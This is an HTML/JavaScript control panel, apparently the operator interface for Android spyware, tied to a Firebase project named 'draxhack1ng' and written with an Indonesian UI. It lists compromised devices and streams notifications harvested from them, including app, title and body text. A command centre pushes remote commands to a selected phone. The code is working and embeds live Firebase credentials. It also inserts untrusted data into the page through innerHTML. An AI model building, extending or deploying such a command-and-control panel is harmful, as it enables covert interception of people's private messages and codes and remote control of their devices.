<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Nexus Admin Panel</title>
<style>
  :root { --bg: #0f1016; --panel: #1a1c24; --border: #2d303d; --accent: #6366f1; --text: #e2e8f0; --success: #22c55e; }
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: monospace; }
  body { background: var(--bg); color: var(--text); padding: 20px; display: flex; flex-direction: column; align-items: center; }
  .container { width: 100%; max-width: 800px; }
  .card { background: var(--panel); padding: 20px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 20px; }
  h2 { font-size: 1.2rem; color: var(--accent); margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
  @media (max-width: 600px) { .grid { grid-template-columns: 1fr; } }
  .device { padding: 10px; background: var(--bg); border: 1px solid var(--border); margin-bottom: 10px; border-radius: 5px; cursor: pointer; }
  .device.active { border-color: var(--accent); }
  input, select, button { width: 100%; padding: 10px; margin-bottom: 10px; background: var(--bg); border: 1px solid var(--border); color: white; border-radius: 5px; }
  button { background: var(--accent); font-weight: bold; cursor: pointer; border: none; }
  .notif-item { padding: 10px; border-bottom: 1px solid var(--border); font-size: 0.85rem; }
  .notif-header { color: var(--accent); font-weight: bold; }
</style>
</head>
<body>
<div class="container">
  <h2>⚡ Nexus Realtime Panel</h2>
  <div class="grid">
    <div class="card">
      <h2>📱 Connected Devices</h2>
      <div id="devices"><p style="color:#64748b">Menunggu koneksi...</p></div>
    </div>
    <div class="card">
      <h2>🎯 Command Center</h2>
      <select id="cmdDevice"><option value="">-- Pilih Device --</option></select>
      <input id="cmdMsg" placeholder="Pesan untuk TOAST">
      <button onclick="sendToast()">🚀 Kirim TOAST</button>
    </div>
  </div>
  <div class="card">
    <h2>🔔 Live Notifications</h2>
    <div id="notifs" style="max-height: 300px; overflow-y: auto;"></div>
  </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getDatabase, ref, onValue, push, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCSUWm0IH4FvbZK6xJ4-2snu-V6_lB5RBw",
  authDomain: "draxhack1ng.firebaseapp.com",
  databaseURL: "https://draxhack1ng-default-rtdb.firebaseio.com",
  projectId: "draxhack1ng",
  storageBucket: "draxhack1ng.firebasestorage.app",
  messagingSenderId: "1053020908869",
  appId: "1:1053020908869:web:d154e3b5d6a4d5e205622c"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

onValue(ref(db, 'devices'), (snap) => {
  const devs = snap.val() || {};
  const list = document.getElementById('devices');
  const select = document.getElementById('cmdDevice');
  list.innerHTML = ''; select.innerHTML = '<option value="">-- Pilih Device --</option>';
  let count = 0;
  for (let id in devs) {
    if (devs[id].active === false) continue;
    count++;
    list.innerHTML += `<div class="device" onclick="document.getElementById('cmdDevice').value='${id}'">
      <b>🟢 ${devs[id].model}</b><br><small style="color:#94a3b8">${id}</small>
    </div>`;
    select.innerHTML += `<option value="${id}">${devs[id].model} (${id.substring(0,6)})</option>`;
  }
  if (count === 0) list.innerHTML = '<p style="color:#64748b">Belum ada device terkoneksi.</p>';
});

onValue(ref(db, 'notifs'), (snap) => {
  const notifs = snap.val() || {};
  let html = '';
  for (let devId in notifs) {
    for (let key in notifs[devId]) {
      const n = notifs[devId][key];
      const time = new Date(n.timestamp).toLocaleTimeString('id-ID');
      html = `<div class="notif-item">
        <div class="notif-header">[${n.app}] <span style="float:right; color:#64748b">${time}</span></div>
        <div style="color:white; font-weight:bold">${n.title}</div>
        <div style="color:#94a3b8">${n.body}</div>
      </div>` + html;
    }
  }
  document.getElementById('notifs').innerHTML = html || '<p style="color:#64748b">Belum ada notifikasi.</p>';
});

window.sendToast = function() {
  const id = document.getElementById('cmdDevice').value;
  const msg = document.getElementById('cmdMsg').value;
  if (!id || !msg) return alert("Pilih device dan isi pesan!");
  const cmdRef = push(ref(db, 'commands/' + id));
  set(cmdRef, { type: 'TOAST', args: { message: msg }, status: 'pending' });
  document.getElementById('cmdMsg').value = '';
  alert('✅ Perintah dikirim real-time!');
}
</script>
</body>
</html>
